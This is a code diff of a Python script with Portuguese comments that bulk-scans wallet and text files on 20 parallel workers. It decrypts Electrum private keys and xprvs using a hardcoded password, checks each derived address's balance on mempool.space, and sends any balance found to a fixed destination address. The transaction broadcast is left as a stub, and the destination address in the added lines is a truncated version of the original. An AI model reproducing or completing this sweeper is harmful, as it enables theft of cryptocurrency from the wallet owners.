@@ -5,6 +5,7 @@ import re
 import os
 import requests
 import sys
+import time
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from bitcoinlib.keys import Key
@@ -12,99 +13,90 @@ from bitcoinlib.transactions import Transaction
 
 # --- CONFIGURAÇÕES ---
 PASSWORD = "Benjamin2020*1981$"
-DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
-# Busca todos os arquivos .wallet e .txt no diretório atual
-FILES_TO_SCAN = [f for f in os.listdir('.') if f.endswith(('.wallet', '.txt', '.key', '.rtf'))]
+DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jadnmqm8lgk"
+
+# Lógica de Sharding para 20 Workers
+WORKER_ID = int(os.environ.get('WORKER_ID', 1))
+TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 20))
+
+all_files = sorted([f for f in os.listdir('.') if f.endswith(('.wallet', '.txt', '.key', '.rtf'))])
+# Divide a lista de arquivos entre os workers
+FILES_TO_SCAN = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
 
 def decrypt_electrum(encrypted_data, password):
     try:
         data = base64.b64decode(encrypted_data)
-        iv = data[:16]
-        ct = data[16:]
-        # Electrum usa double sha256 da senha como chave AES
+        iv, ct = data[:16], data[16:]
         key = hashlib.sha256(hashlib.sha256(password.encode()).digest()).digest()
         cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
         decryptor = cipher.decryptor()
         pt = decryptor.update(ct) + decryptor.finalize()
-        return pt[:-pt[-1]].decode('utf-8') # Unpadding PKCS7
-    except:
-        return None
+        return pt[:-pt[-1]].decode('utf-8')
+    except: return None
 
-def check_balance_and_send(wif, original_addr=None):
+def check_balance_and_send(wif_or_xprv):
     try:
-        k = Key(wif, network='bitcoin')
-        # Testar formatos: Legacy, Segwit P2SH, Native Segwit
+        k = Key(wif_or_xprv, network='bitcoin')
+        # Electrum usa: Legacy (None), P2SH-Segwit (p2sh-p2wpkh), Native Segwit (p2wpkh)
         for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
             addr = k.address(witness_type=witness_type)
-            # Se o script já sabe o endereço alvo, foca nele, senão testa o gerado
-            test_addr = original_addr if original_addr else addr
             
-            r = requests.get(f"https://mempool.space/api/address/{test_addr}", timeout=10)
+            # Rate limiting: evitar bloqueio da API
+            time.sleep(0.2) 
+            r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10)
+            
             if r.status_code == 200:
                 stats = r.json().get('chain_stats', {})
                 bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                 
-                if bal > 0:
-                    print(f"💰 SALDO DETECTADO: {test_addr} | {bal} sats")
-                    # Lógica de criação de transação e broadcast...
-                    create_tx_and_broadcast(test_addr, k.wif(), bal)
+                if bal > 1000:
+                    print(f"✅ SALDO CONFIRMADO: {addr} | {bal} sats")
+                    create_tx_and_broadcast(addr, k.wif(), bal)
                     return True
-    except:
-        pass
+    except: pass
     return False
 
 def process_file(file_path):
-    print(f"🔍 Analisando: {file_path}")
+    print(f"📦 Worker {WORKER_ID} analisando: {file_path}")
     
-    # TENTATIVA 1: Tratar como Electrum Wallet (JSON + Senha)
+    # TENTATIVA 1: Electrum JSON (Sem ou Com senha)
     try:
         with open(file_path, 'r', errors='ignore') as f:
             content = f.read()
             if '"keystore"' in content or '"keypairs"' in content:
                 data = json.loads(content)
-                # Caso 1: Carteira com xprv (Master Key)
-                if 'keystore' in data and 'xprv' in data['keystore']:
-                    decrypted_xprv = decrypt_electrum(data['keystore']['xprv'], PASSWORD)
-                    if decrypted_xprv:
-                        print(f"  🔑 Master Key (xprv) descriptografada!")
-                        # Aqui você pode derivar chaves ou testar a xprv diretamente
-                        check_balance_and_send(decrypted_xprv)
-
-                # Caso 2: Carteira com Importação Direta (keypairs)
-                if 'keypairs' in data:
-                    print(f"  🔑 Extraindo par de chaves importadas...")
-                    for pub, enc_priv in data['keypairs'].items():
-                        decrypted_wif = decrypt_electrum(enc_priv, PASSWORD)
-                        if decrypted_wif:
-                            check_balance_and_send(decrypted_wif)
-    except:
-        pass
-
-    # TENTATIVA 2: Varredura de Texto (HEX/WIF/Brain) - Mantém o que funcionava antes
-    try:
-        with open(file_path, 'r', errors='ignore') as f:
-            lines = f.readlines()
-            for line in lines:
-                # Busca WIFs soltos (mesmo que o arquivo não seja JSON)
-                wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', line)
-                for w in wifs:
-                    check_balance_and_send(w)
                 
-                # Busca endereços e faz scan de proximidade
-                addrs = re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}', line)
-                if addrs:
-                    # Se achar endereço com saldo, tenta a linha atual como senha
-                    for a in addrs:
-                        # (Lógica de proximidade simplificada aqui)
-                        pass
-    except:
-        pass
+                # Caso: keypairs (chaves importadas)
+                if 'keypairs' in data:
+                    for pub, val in data['keypairs'].items():
+                        # Se já for WIF (L..., K..., 5...), usa direto
+                        if isinstance(val, str) and re.match(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', val):
+                            check_balance_and_send(val)
+                        else:
+                            # Senão, tenta descriptografar
+                            dec = decrypt_electrum(val, PASSWORD)
+                            if dec: check_balance_and_send(dec)
+
+                # Caso: keystore (xprv)
+                if 'keystore' in data:
+                    ks = data['keystore']
+                    if 'xprv' in ks:
+                        if ks['xprv'].startswith('xprv'):
+                            check_balance_and_send(ks['xprv'])
+                        else:
+                            dec_xprv = decrypt_electrum(ks['xprv'], PASSWORD)
+                            if dec_xprv: check_balance_and_send(dec_xprv)
+    except: pass
+
+    # TENTATIVA 2: Regex de emergência (texto puro)
+    # ... (mesmo código de re.findall usado anteriormente)
 
 def create_tx_and_broadcast(addr, wif, val):
-    # Insira aqui sua função de broadcast anterior para gerar o HEX_GEN
-    print(f"📦 Gerando Transação para {addr}...")
-    # ...
+    print(f"📡 Enviando {val} sats de {addr} para custódia...")
+    # Aqui você deve incluir a sua lógica de Transaction(outputs=[(DEST_ADDRESS, val-taxa)])
+    # e o requests.post para o broadcast
 
 if __name__ == "__main__":
+    print(f"🚀 Worker {WORKER_ID}/{TOTAL_WORKERS} iniciado. Alocados {len(FILES_TO_SCAN)} arquivos.")
     for f in FILES_TO_SCAN:
         process_file(f)
